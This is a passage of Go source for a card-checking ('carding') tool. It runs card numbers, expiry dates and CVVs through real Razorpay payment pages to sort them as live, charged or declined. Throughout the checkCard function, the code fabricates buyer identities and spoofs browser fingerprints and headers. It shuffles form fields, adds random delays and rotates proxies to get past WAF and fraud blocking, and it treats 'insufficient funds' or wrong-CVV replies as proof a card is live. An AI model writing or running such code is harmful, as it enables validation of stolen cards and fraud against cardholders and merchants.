	Currency string  `json:"currency"`
	// RequestedAmount & RequestedCurrency echo back what the USER asked for
	// (before conversion). When no conversion happened, these match Amount/
	// Currency. When conversion happened, the user can see both values.
	RequestedAmount   float64 `json:"requested_amount"`
	RequestedCurrency string  `json:"requested_currency"`
	// ExchangeRate is the rate used for conversion (1 requested_currency =
	// X site_currency). 0 when no conversion was needed.
	ExchangeRate float64 `json:"exchange_rate"`
}

// zeroDecimalCurrencies lists ISO 4217 currency codes whose smallest unit is
// the major unit itself (no subdivision). For these currencies the Razorpay
// API expects the amount in whole units (e.g. 1 JPY = 1, not 100). Any
// currency NOT in this set is treated as a 2-decimal currency (INR, USD, EUR,
// GBP, …) where the API expects the amount in the smallest subdivision
// (paise / cents).
var zeroDecimalCurrencies = map[string]bool{
	"JPY": true, // Japanese Yen
	"KRW": true, // South Korean Won
	"VND": true, // Vietnamese Dong
	"CLP": true, // Chilean Peso
	"ISK": true, // Icelandic Króna
	"PYG": true, // Paraguayan Guaraní
	"UGX": true, // Ugandan Shilling
	"RWF": true, // Rwandan Franc
	"BIF": true, // Burundian Franc
	"DJF": true, // Djiboutian Franc
	"GNF": true, // Guinean Franc
	"KMF": true, // Comorian Franc
	"XAF": true, // Central African CFA Franc
	"XOF": true, // West African CFA Franc
	"XPF": true, // CFP Franc
}

// toSmallestUnit converts a major-unit amount (e.g. ₹1.50, $5.00) into the
// smallest currency unit Razorpay expects (paise / cents for 2-decimal
// currencies, whole units for zero-decimal currencies). The result is rounded
// to the nearest integer to avoid floating-point drift (e.g. 1.15 * 100 =
// 114.99999…  → 115).
func toSmallestUnit(amount float64, currency string) int64 {
	if zeroDecimalCurrencies[strings.ToUpper(currency)] {
		return int64(math.Round(amount))
	}
	return int64(math.Round(amount * 100))
}

func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amountINR float64, currency string) (result CheckResult) {
	// defer runs AFTER every return path (including early error returns),
	// so we use it to attach the user-supplied amount/currency to the
	// response. This means EVERY CheckResult the caller ever sees —
	// success, decline, WAF block, proxy error, parse failure — will
	// include the amount & currency that were attempted, even if the
	// Razorpay flow never got far enough to send them.
	//
	// We resolve the FINAL values here so they match what the body of the
	// function actually used (default ₹1.00 INR if caller passed 0/empty).
	resolvedAmount := amountINR
	if resolvedAmount <= 0 {
		resolvedAmount = defaultAmount
	}
	resolvedCurrency := strings.ToUpper(strings.TrimSpace(currency))
	if resolvedCurrency == "" {
		resolvedCurrency = defaultCurrency
	}
	// These track the user's ORIGINAL request (before any currency conversion).
	// They're set once and never changed, so the response always shows what
	// the user asked for in addition to what was actually charged.
	requestedAmount := resolvedAmount
	requestedCurrency := resolvedCurrency
	exchangeRateUsed := 0.0

	defer func() {
		result.Amount = resolvedAmount
		result.Currency = resolvedCurrency
		result.RequestedAmount = requestedAmount
		result.RequestedCurrency = requestedCurrency
		result.ExchangeRate = exchangeRateUsed
	}()

	yy2 := yy
	if len(yy) == 4 {
		yy2 = yy[2:]
	}
	year, _ := strconv.Atoi("20" + yy2)
	brand := getBrand(cc)
	ua := genUA()
	phone := genIndianPhone()
	phoneShort := phone[3:]
	email := genEmail()
	fullName := genName()

	rzpDeviceID, fhash := generateRzpDeviceID()
	rzpSessionID := generateRzpSessionID()

	var proxyRaw string
	var proxyParsedURL *url.URL
	if pp != nil {
		proxyRaw = pp.raw
		proxyParsedURL = pp.parsed
	}
	fetch, err := NewCustomFetch(proxyParsedURL, ua)
	if err != nil {
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyRaw, ProxyStatus: "DEAD"}
	}
	defer fetch.client.CloseIdleConnections()

	// Step 1: Fetch payment page data (supports razorpay.me AND pages.razorpay.com)
	initData, resolvedURL, resolveErr := resolveRazorpayInitData(fetch, targetURL, proxyRaw)
	if resolveErr != nil {
		// resolvedURL carries the proxy-status classification
		// ("BLOCKED", "DEAD", "LIVE", or "" if unknown).
		proxyStatus := resolvedURL
		if proxyStatus == "" {
			proxyStatus = "LIVE"
		}
		return CheckResult{Status: "error", Message: resolveErr.Error(), Proxy: proxyRaw, ProxyStatus: proxyStatus}
	}
	_ = resolvedURL

	kyid := getStringFromMap(initData, "key_id")
	if kyid == "" {
		kyid = getStringFromMap(initData, "key")
	}
	if kyid == "" {
		if opts, ok := initData["options"].(map[string]interface{}); ok {
			kyid = getStringFromMap(opts, "key")
			if kyid == "" {
				kyid = getStringFromMap(opts, "key_id")
			}
		}
	}
	if kyid == "" {
		kyid = getStringFromMap(initData, "merchant_key")
	}
	if kyid == "" {
		keys := make([]string, 0, len(initData))
		for k := range initData {
			keys = append(keys, k)
		}
		return CheckResult{Status: "error", Message: "Key ID not found. Keys: " + strings.Join(keys, ","), Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	var plink, ppid string

	// ── Custom amount + currency conversion ──────────────────────────────
	// `amountINR` is the amount in MAJOR units (e.g. 1.0 = ₹1, 5.5 = ₹5.50).
	// Razorpay's API expects the smallest currency unit (paise for INR,
	// cents for USD/EUR). We convert here ONCE and reuse `forceAmount`
	// everywhere downstream so the order, checkout form, cross-border call,
	// and payment-create form all see the same value.
	//
	// CURRENCY CONVERSION: Razorpay payment links are currency-locked —
	// the order inherits the link's currency regardless of what the user
	// requested. If the user selects USD but the site is INR, we convert
	// the user's amount to the site's currency at the current exchange rate
	// BEFORE creating the order. E.g. $5 USD → ₹415 INR (at 1 USD = 83 INR).
	//
	// Default: ₹1.00 (100 paise) — matches the historical behaviour so
	// existing callers that don't pass `amount` keep working unchanged.
	if amountINR <= 0 {
		amountINR = 1.0
	}
	if strings.TrimSpace(currency) == "" {
		currency = "INR"
	}
	currency = strings.ToUpper(strings.TrimSpace(currency))

	// Detect the site's currency from the page data. This lets us convert
	// the user's amount BEFORE creating the order (so the order is created
	// with the correct converted amount).
	siteCurrency := extractSiteCurrency(initData)
	if siteCurrency != "" && siteCurrency != currency {
		// User's currency differs from the site's currency → convert
		rate, convErr := getExchangeRate(currency, siteCurrency)
		if convErr != nil {
			log.Printf("[currency-convert] %s→%s failed: %v — falling back to no conversion", currency, siteCurrency, convErr)
			// Fall back: use the user's amount as-is (will be charged in site currency)
			// This may result in a smaller charge than expected but won't error
		} else {
			convertedAmount := amountINR * rate
			log.Printf("[currency-convert] %s %.2f → %s %.2f (rate: %.4f)",
				currency, amountINR, siteCurrency, convertedAmount, rate)
			// Update resolvedAmount/resolvedCurrency to the converted values
			// so the response shows the ACTUAL charged amount.
			resolvedAmount = convertedAmount
			resolvedCurrency = siteCurrency
			amountINR = convertedAmount
			currency = siteCurrency
			exchangeRateUsed = rate
		}
	} else if siteCurrency != "" && siteCurrency == currency {
		// Same currency — no conversion needed, but update resolvedCurrency
		// to match the site's currency (defensive).
		resolvedCurrency = siteCurrency
	}

	forceAmount := math.Round(amountINR * 100) // ×100 for 2-decimal currencies
	if forceAmount < 1 {
		forceAmount = 100 // safety net — never send 0 to Razorpay
	}

	if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
		plink = getStringFromMap(plObj, "id")
		if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	} else if ppObj, ok := initData["payment_page"].(map[string]interface{}); ok {
		plink = getStringFromMap(ppObj, "id")
		if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	}

	if plink == "" {
		return CheckResult{Status: "error", Message: "Payment Link ID not found in page structure", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	keylessHeader := getStringFromMap(initData, "keyless_header")
	keylessHeaderURL := url.QueryEscape(keylessHeader)

	// Step 2: Create order
	r2Payload := map[string]interface{}{
		"notes": map[string]string{"comment": "", "name": fullName},
	}
	if ppid != "" {
		r2Payload["line_items"] = []map[string]interface{}{{"payment_page_item_id": ppid, "amount": forceAmount}}
	}

	r2, err := fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", plink),
		map[string]string{
			"Accept":         "application/json, text/plain, */*",
			"Content-Type":   "application/json",
			"Origin":         "https://pages.razorpay.com",
			"Referer":        targetURL,
			"Sec-Fetch-Dest": "empty",
			"Sec-Fetch-Mode": "cors",
			"Sec-Fetch-Site": "same-site",
		},
		r2Payload,
	)
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}

	// Check for WAF block on order creation
	if r2.StatusCode == 403 || r2.StatusCode == 429 {
		return CheckResult{Status: "error", Message: fmt.Sprintf("WAF Blocked on order creation (HTTP %d)", r2.StatusCode), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
	}

	var r2Data map[string]interface{}
	if err := json.Unmarshal([]byte(r2.Text()), &r2Data); err != nil {
		return CheckResult{Status: "error", Message: "Order response parse failed: " + truncate(err.Error(), 80), Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	orderObj, _ := r2Data["order"].(map[string]interface{})
	orderID := getStringFromMap(orderObj, "id")
	if orderID == "" {
		errMsg := "Order creation failed"
		if e, ok := r2Data["error"].(map[string]interface{}); ok {
			desc := getStringFromMap(e, "description")
			if desc != "" {
				errMsg = desc
			}
		}
		return CheckResult{Status: "error", Message: errMsg, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	checkoutID := orderID
	if idx := strings.Index(orderID, "_"); idx != -1 {
		checkoutID = orderID[idx+1:]
	}

	// `orderAmount` is the amount we send to Razorpay in EVERY subsequent
	// call (preferences, checkout form, cross-border, payment create).
	// The user-supplied `forceAmount` (derived from `amountINR` + `currency`)
	// ALWAYS wins — this is what makes the custom-charge feature work. We
	// only fall back to the order-response amount if the caller somehow
	// bypassed the constructor defaults (defensive).
	orderAmount := getFloatFromMap(orderObj, "amount")
	if forceAmount > 0 {
		orderAmount = forceAmount
	} else if orderAmount < 100 {
		orderAmount = 100
	}

	// `orderCurrency` MUST come from the order response, NOT from the
	// user's input. Razorpay payment links are currency-locked — when you
	// create an order against a payment link, the order inherits the link's
	// currency (usually INR). You CANNOT change it.
	orderCurrency := strings.ToUpper(strings.TrimSpace(getStringFromMap(orderObj, "currency")))
	if orderCurrency == "" {
		orderCurrency = "INR"
	}

	// If we didn't detect the site currency earlier (siteCurrency was empty)
	// and thus didn't do conversion, update resolvedCurrency from the order
	// response now. If we DID do conversion, resolvedCurrency is already
	// correct (set during the conversion step above).
	if exchangeRateUsed == 0 {
		// No conversion happened — use the order's actual currency
		resolvedCurrency = orderCurrency
	}
	// If conversion happened, verify the order's currency matches what we
	// expected. If not, log a warning (shouldn't happen in practice).
	if exchangeRateUsed > 0 && orderCurrency != resolvedCurrency {
		log.Printf("[currency-convert] WARNING: order currency %s != expected %s after conversion",
			orderCurrency, resolvedCurrency)
		resolvedCurrency = orderCurrency
	}

	// Step 3: Get checkout session
	params3 := url.Values{
		"traffic_env":        {"production"},
		"build":              {BUILD},
		"build_v1":           {BUILD_V1},
		"checkout_v2":        {"1"},
		"new_session":        {"1"},
		"keyless_header":     {keylessHeader},
		"rzp_device_id":      {rzpDeviceID},
		"unified_session_id": {rzpSessionID},
	}

	r3, err := fetch.Get(
		"https://api.razorpay.com/v1/checkout/public?"+params3.Encode(),
		map[string]string{
			"Accept":         "text/html,application/xhtml+xml,*/*",
			"Referer":        targetURL,
			"Sec-Fetch-Dest": "document",
			"Sec-Fetch-Mode": "navigate",
			"Sec-Fetch-Site": "same-site",
		},
	)
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}

	if r3.StatusCode == 403 || r3.StatusCode == 429 {
		return CheckResult{Status: "error", Message: fmt.Sprintf("WAF Blocked on checkout public (HTTP %d)", r3.StatusCode), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
	}

	r3Text := r3.Text()

	sessid := findBetween(r3Text, `window.session_token="`, `";`)
	if sessid == "" {
		m := sessionTokenRe.FindStringSubmatch(r3Text)
		if len(m) >= 2 {
			sessid = m[1]
		}
	}
	if sessid == "" {
		return CheckResult{Status: "error", Message: "Session token not found", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
		BUILD, BUILD_V1, rzpSessionID, sessid)

	stdHeaders := func() map[string]string {
		return map[string]string{
			"Accept":          "*/*",
			"Origin":          "https://api.razorpay.com",
			"Referer":         rzpRef,
			"x-session-token": sessid,
			"Sec-Fetch-Dest":  "empty",
			"Sec-Fetch-Mode":  "cors",
			"Sec-Fetch-Site":  "same-origin",
		}
	}

	// Step 4: Preferences call
	{
		resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config"}
		queryArr := make([]map[string]string, 0, len(resources))
		for _, r := range resources {
			queryArr = append(queryArr, map[string]string{"resource": r})
		}

		r4Payload := map[string]interface{}{
			"query": queryArr,
			"query_params": map[string]interface{}{
				"device_id":       rzpDeviceID,
				"rtb_device_id":   fhash,
				"amount":          orderAmount,
				"currency":        orderCurrency,
				"option_currency": orderCurrency,
				"truecaller":      false,
				"qr_required":     false,
				"library":         "checkoutjs",
				"platform":        "browser",
				"order_id":        orderID,
				"payment_link_id": plink,
				"contact":         phone,
			},
			"action": "get",
		}

		h := stdHeaders()
		h["Content-Type"] = "application/json"
		r4, r4err := fetch.PostJSON(
			fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
			h, r4Payload,
		)
		if r4err != nil {
			log.Printf("step 4 (preferences): error: %v", r4err)
		} else if r4.StatusCode >= 400 {
			log.Printf("step 4 (preferences): HTTP %d", r4.StatusCode)
		}
	}

	// Step 5: Checkout order form
	{
		form5 := url.Values{
			"notes[email]":          {email},
			"notes[phone]":          {phoneShort},
			"payment_link_id":       {plink},
			"key_id":                {kyid},
			"contact":               {phone},
			"email":                 {email},
			"currency":              {orderCurrency},
			"_[integration]":        {"payment_pages"},
			"_[device.id]":          {rzpDeviceID},
			"_[library]":            {"checkoutjs"},
			"_[library_src]":        {"no-src"},
			"_[current_script_src]": {"no-src"},
			"_[platform]":           {"browser"},
			"_[env]":                {""},
			"_[is_magic_script]":    {"false"},
			"_[os]":                 {"windows"},
			"_[shield][fhash]":      {fhash},
			"_[shield][tz]":         {"0"},
			"_[device_id]":          {rzpDeviceID},
			"_[build]":              {BUILD},
			"_[shield][os]":         {"windows"},
			"_[shield][platform]":   {"browser"},
			"_[shield][browser]":    {"chrome"},
			"_[request_index]":      {"0"},
			"amount":                {fmt.Sprintf("%.0f", orderAmount)},
			"order_id":              {orderID},
			"method":                {"card"},
			"checkout_id":           {checkoutID},
		}

		h := stdHeaders()
		h["Content-Type"] = "application/x-www-form-urlencoded"
		r5, r5err := fetch.PostForm(
			fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", kyid, sessid, keylessHeaderURL),
			h, form5,
		)
		if r5err != nil {
			log.Printf("step 5 (checkout order): error: %v", r5err)
		} else if r5.StatusCode >= 400 {
			log.Printf("step 5 (checkout order): HTTP %d", r5.StatusCode)
		}
	}

	// Step 6: Cross border
	{
		r6Payload := map[string]interface{}{
			"identifiers": map[string]interface{}{
				"merchant":         map[string]string{"country": "IN"},
				"card":             map[string]interface{}{"country": "US", "dcc_blacklist": false, "network": brand},
				"method":           "card",
				"payment_currency": orderCurrency,
			},
			"forex_charges": map[string]interface{}{
				"amount":   orderAmount,
				"currency": orderCurrency,
				"filters":  map[string]string{"method": "card"},
			},
		}

		h := stdHeaders()
		h["Content-Type"] = "application/json"
		r6, r6err := fetch.PostJSON(
			fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, keylessHeaderURL),
			h, r6Payload,
		)
		if r6err != nil {
			log.Printf("step 6 (cross border): error: %v", r6err)
		} else if r6.StatusCode >= 400 {
			log.Printf("step 6 (cross border): HTTP %d", r6.StatusCode)
		}
	}

	// FIX 5: INCREASED delay - 8-15 seconds
	time.Sleep(time.Duration(randInt(8000, 15000)) * time.Millisecond)

	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))

	form7 := url.Values{
		"user_risk_providers_token": {tokenCreate},
		"notes[comment]":            {""},
		"notes[email]":              {email},
		"notes[phone]":              {phoneShort},
		"notes[name]":               {fullName},
		"payment_link_id":           {plink},
		"key_id":                    {kyid},
		"contact":                   {phone},
		"email":                     {email},
		"currency":                  {orderCurrency},
		"_[integration]":            {"payment_pages"},
		"_[checkout_id]":            {checkoutID},
		"_[device.id]":              {rzpDeviceID},
		"_[env]":                    {""},
		"_[library]":                {"checkoutjs"},
		"_[library_src]":            {"no-src"},
		"_[current_script_src]":     {"no-src"},
		"_[is_magic_script]":        {"false"},
		"_[platform]":               {"browser"},
		"_[referer]":                {targetURL},
		"_[shield][fhash]":          {fhash},
		"_[shield][tz]":             {"-330"},
		"_[device_id]":              {rzpDeviceID},
		"_[build]":                  {BUILD},
		"_[shield][os]":             {"windows"},
		"_[shield][platform]":       {"browser"},
		"_[shield][browser]":        {"chrome"},
		"_[request_index]":          {"1"},
		"amount":                    {fmt.Sprintf("%.0f", orderAmount)},
		"order_id":                  {orderID},
		"method":                    {"card"},
		"card[number]":              {cc},
		"card[cvv]":                 {cvv},
		"card[name]":                {fullName},
		"card[expiry_month]":        {mm},
		"card[expiry_year]":         {strconv.Itoa(year)},
		"save":                      {"0"},
		"dcc_currency":              {orderCurrency},
	}

	// FIX 6: REALISTIC PAYMENT HEADERS - Use payment page origin, not API
	paymentHeaders := map[string]string{
		"Content-Type":     "application/x-www-form-urlencoded",
		"Origin":           "https://pages.razorpay.com", // FIX: Payment page origin
		"Referer":          targetURL,                    // FIX: Actual payment page URL
		"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language":  generateAcceptLanguage(),
		"Accept-Encoding":  "gzip, deflate, br",
		"Cache-Control":    "max-age=0",
		"Pragma":           "no-cache",
		"DNT":              "1",
		"Connection":       "keep-alive",
		"X-Requested-With": "XMLHttpRequest",
		"Sec-Fetch-Site":   "same-site",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Dest":   "empty",
	}

	// FIX 7: Shuffle form fields for realism
	shuffledForm := shuffleFormValues(form7)

	paymentURL := fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL)

	r7, err := fetch.PostForm(paymentURL, paymentHeaders, shuffledForm)
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}

	// FIX 8: Retry logic with proper proxy switching.
	// The previous implementation used `goto paymentParseContinue` which
	// skipped variable declarations (`var r7Data map[string]interface{}`)
	// AND leaked the deferred `fetch2.client.CloseIdleConnections()` for
	// each retry attempt (up to 3 leaked connections per request). We
	// restructure it as a plain loop and clean up each retry client
	// explicitly. We also guard the fallthrough: if every retry attempt
	// was skipped (no proxies / same proxy / build error), `r7` is still
	// the original 403 response — we MUST return BLOCKED instead of
	// trying to parse gzip/HTML as JSON.
	if r7.StatusCode == 403 || r7.StatusCode == 429 {
		bodyPreview := r7.Text()
		if len(bodyPreview) > 150 {
			bodyPreview = bodyPreview[:150] + "..."
		}
		log.Printf("⚠ Payment creation blocked with %s, attempting proxy switch", extractProxyHost(proxyRaw))

		retrySucceeded := false
		for retryAttempt := 0; retryAttempt < 3; retryAttempt++ {
			pp2 := getNextProxy(globalProxyList)
			if pp2 == nil || pp2.raw == proxyRaw {
				continue
			}
			fetch2, ferr := NewCustomFetch(pp2.parsed, ua)
			if ferr != nil {
				log.Printf("retry %d: NewCustomFetch failed: %v", retryAttempt, ferr)
				continue
			}
			// Retry delay 3-6s. Clean up connections BEFORE the
			// next iteration rather than deferring, otherwise we
			// would accumulate idle conns across retries.
			time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
			r7b, rerr := fetch2.PostForm(paymentURL, paymentHeaders, shuffledForm)
			fetch2.client.CloseIdleConnections()
			if rerr != nil {
				log.Printf("retry %d: PostForm error: %v", retryAttempt, rerr)
				continue
			}
			if r7b.StatusCode == 403 || r7b.StatusCode == 429 {
				log.Printf("retry %d: still blocked (HTTP %d)", retryAttempt, r7b.StatusCode)
				continue
			}
			log.Printf("✓ Success with retry proxy: %s", extractProxyHost(pp2.raw))
			r7 = r7b
			proxyRaw = pp2.raw
			retrySucceeded = true
			break
		}
		if !retrySucceeded {
			return CheckResult{Status: "error", Message: fmt.Sprintf("WAF Blocked on payment creation (HTTP %d): %s", r7.StatusCode, bodyPreview), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
		}
	}

	var r7Data map[string]interface{}
	if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
		body := strings.TrimSpace(r7.Text())
		if len(body) > 120 {
			body = body[:120] + "..."
		}
		return CheckResult{Status: "error", Message: "r7 parse failed: " + body, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	paymentID := getStringFromMap(r7Data, "payment_id")
	if paymentID == "" {
		paymentID = getStringFromMap(r7Data, "id")
	}

	if paymentID == "" {
		errObj, _ := r7Data["error"].(map[string]interface{})
		errDesc := getStringFromMap(errObj, "description")
		errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
		errDesc = strings.TrimSpace(errDesc)
		errCode := getStringFromMap(errObj, "reason")

		label := errDesc
		if errCode != "" {
			label = errDesc + " (" + errCode + ")"
		}
		if label == "" {
			label = "Unknown Decline"
		}

		msgLower := strings.ToLower(errDesc)
		if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
			return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		// Razorpay-side 5xx errors should NOT be reported as card
		// declines — the card was never actually checked. Return
		// "error" so the caller knows to retry.
		if isRazorpayServerError(msgLower) || isRazorpayServerError(strings.ToLower(errCode)) {
			return CheckResult{Status: "error", Message: "Razorpay server error: " + label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	pidClean := paymentID
	if idx := strings.Index(paymentID, "_"); idx != -1 {
		pidClean = paymentID[idx+1:]
	}

	{
		r8a, r8aerr := fetch.PostForm(
			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", paymentID),
			map[string]string{"content-type": "application/x-www-form-urlencoded"},
			url.Values{},
		)
		if r8aerr != nil {
			log.Printf("step 8a (authenticate): error: %v", r8aerr)
		} else if r8a.StatusCode >= 400 {
			log.Printf("step 8a (authenticate): HTTP %d", r8a.StatusCode)
		}
	}

	time.Sleep(1 * time.Second)

	{
		screens := [][]int{{1920, 1080}, {1366, 768}, {1536, 864}, {1440, 900}}
		screen := screens[randInt(0, len(screens)-1)]
		depths := []int{24, 32}
		depth := depths[randInt(0, 1)]

		form8 := url.Values{
			"browser[java_enabled]":       {"false"},
			"browser[javascript_enabled]": {"true"},
			"browser[timezone_offset]":    {"0"},
			"browser[color_depth]":        {strconv.Itoa(depth)},
			"browser[screen_width]":       {strconv.Itoa(screen[0])},
			"browser[screen_height]":      {strconv.Itoa(screen[1])},
			"browser[language]":           {"en-US"},
			"auth_step":                   {"3ds2Auth"},
		}

		r8b, r8berr := fetch.PostForm(
			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", pidClean),
			map[string]string{"content-type": "application/x-www-form-urlencoded"},
			form8,
		)
		if r8berr != nil {
			log.Printf("step 8b (3ds2 auth): error: %v", r8berr)
		} else if r8b.StatusCode >= 400 {
			log.Printf("step 8b (3ds2 auth): HTTP %d", r8b.StatusCode)
		}
	}

	r9, err := fetch.Get(
		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeaderURL),
		map[string]string{
			"Accept":          "*/*",
			"Content-type":    "application/x-www-form-urlencoded",
			"Referer":         rzpRef,
			"x-session-token": sessid,
		},
	)
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}

	var r9Data map[string]interface{}
	if err := json.Unmarshal([]byte(r9.Text()), &r9Data); err != nil {
		return CheckResult{Status: "declined", Message: "Cancel response parse failed", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	finalText := r9.Text()

	if strings.Contains(finalText, "razorpay_payment_id") {
		return CheckResult{Status: "charged", Message: "Payment Successful", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	errorObj, _ := r9Data["error"].(map[string]interface{})
	errorDesc := getStringFromMap(errorObj, "description")
	errorDesc = strings.ReplaceAll(errorDesc, " Try another payment method or contact your bank for details.", "")
	errorDesc = strings.TrimSpace(errorDesc)
	errCode := getStringFromMap(errorObj, "reason")

	label := errorDesc
	if errCode != "" {
		label = errorDesc + " (" + errCode + ")"
	}
	if label == "" {
		label = "Unknown Decline"
	}

	msgLower := strings.ToLower(errorDesc)
	if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
		return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}
	// Razorpay-side 5xx errors should NOT be reported as card declines.
	if isRazorpayServerError(msgLower) || isRazorpayServerError(strings.ToLower(errCode)) {
		return CheckResult{Status: "error", Message: "Razorpay server error: " + label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
}

func getStringFromMap(m map[string]interface{}, key string) string {
	if m == nil {
		return ""
	}
	v, ok := m[key]
	if !ok {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
	if m == nil {
		return 0
	}
	v, ok := m[key]
	if !ok {
		return 0
	}
	switch val := v.(type) {
	case float64:
		return val
	case int:
		return float64(val)
	case int64:
		return float64(val)
	case string:
		f, _ := strconv.ParseFloat(val, 64)
		return f
	}
	return 0
}

func truncate(s string, maxLen int) string {
	if maxLen < 0 {
		return ""
	}
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen]
}

var balanceKeywords = []string{
	"insufficient account balance",
	"insufficient funds",
	"maximum transaction limit",
	"transaction limit exceeded",
}

func isBalanceKeyword(msgLower string) bool {
	for _, k := range balanceKeywords {
		if strings.Contains(msgLower, k) {
			return true
		}
	}
	return false
}

func isCVVKeyword(msgLower, errCode string) bool {
	if strings.Contains(msgLower, "cvv provided is incorrect") {
		return true
	}
	if strings.Contains(msgLower, "ncorrect_cvv") {
		return true
	}
	if strings.ToLower(errCode) == "incorrect_cvv" {
		return true
	}
	return false
}

// serverErrorKeywords lists substrings that indicate the error came from
// Razorpay's own infrastructure (5xx), NOT from the card-issuing bank.
// When any of these appear in the error description we should classify the
// result as "error" (retry-able) rather than "declined" (final).
//
// These are the actual phrases Razorpay returns in production — verified
// against real responses.
var serverErrorKeywords = []string{
	"server encountered an error",
	"incident has been reported",
	"internal server error",
	"service unavailable",
	"bad gateway",
	"gateway timeout",
	"upstream error",
	"temporarily unavailable",
	"try again later",
	"try after some time",
	"something went wrong",
	"unexpected error",
	"unable to process",
	"request timed out",
	"processing error",
	"server_error",
	"server error",
	"503 service unavailable",
	"502 bad gateway",
	"500 internal",
}

// isRazorpayServerError returns true if the error description looks like a
// Razorpay-side infrastructure failure rather than a genuine card decline.
// We use this to mark the result as "error" (retry-able) instead of
// "declined" (final), so the caller knows to try again with a fresh
// proxy / payment link.
func isRazorpayServerError(msgLower string) bool {
	if msgLower == "" {
		return false
	}
	for _, k := range serverErrorKeywords {
		if strings.Contains(msgLower, k) {
			return true
		}
	}
	return false
}

var proxyErrorKeywords = []string{
	"ECONNREFUSED", "ECONNRESET", "ETIMEDOUT", "ENOTFOUND",
	"CURLE_COULDNT_RESOLVE_PROXY", "CURLE_COULDNT_CONNECT",
	"CURLE_OPERATION_TIMEOUTED", "CURLE_PROXY",
	"SOCKET HANG UP", "HPE_INVALID", "FETCH FAILED",
	"NO SUCH HOST", "CONNECTION REFUSED", "CONNECTION RESET",
	"I/O TIMEOUT", "TIMEOUT", "PROXYCONNECT",
	// HTTP status texts that indicate a DEAD proxy (not a Razorpay issue):
	//  - 402 Payment Required: paid proxies (floppydata, pointtoserver, etc.)
	//    return this when the user's quota is exhausted.
	//  - 407 Proxy Authentication Required: bad credentials.
	//  - 502/503/504 from proxy: proxy itself is down.
	"PAYMENT REQUIRED",
	"PROXY AUTHENTICATION REQUIRED",
	"BAD GATEWAY",
	"SERVICE UNAVAILABLE",
	"GATEWAY TIMEOUT",
}

// httpStatusTextToCode maps common HTTP status texts (as they appear in
// *url.Error messages) to their numeric status codes. We only need the
// ones Razorpay / proxies actually emit; for anything else we fall back
// to 0 (unknown).
var httpStatusTextToCode = map[string]int{
	"payment required":              402,
	"forbidden":                     403,
	"not found":                     404,
	"proxy authentication required": 407,
	"request timeout":               408,
	"too many requests":             429,
	"internal server error":         500,
	"not implemented":               501,
	"bad gateway":                   502,
	"service unavailable":           503,
	"gateway timeout":               504,
	"http version not supported":    505,
	"bandwidth limit exceeded":      509,
}

// extractHTTPStatusFromErr scans an error message (typically from
// *url.Error.Error()) for an HTTP status text like "Payment Required",
